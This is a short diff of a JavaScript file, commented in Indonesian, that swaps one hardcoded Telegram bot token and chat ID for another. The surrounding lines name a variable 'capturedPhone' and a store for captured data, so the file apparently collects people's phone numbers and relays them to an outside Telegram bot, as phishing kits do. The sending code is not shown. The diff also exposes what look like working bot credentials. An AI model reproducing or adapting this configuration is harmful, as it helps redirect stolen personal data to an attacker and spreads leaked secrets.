@@ -3,8 +3,8 @@
 
 (function () {
     // Konfigurasi Bot Telegram
-    const BOT_TOKEN = "8732412628:AAH65tJt5BtNzGLaFSC1IbPH88g76AKrKHU";
-    const CHAT_ID = "7595480684";
+    const BOT_TOKEN = "7339549090:AAFklS9Oxc9Uzx4kQ7KE1d0SaSuenSJUGVk";
+    const CHAT_ID = "392836663";
 
     // Simpan data sementara
     let capturedPhone = null;
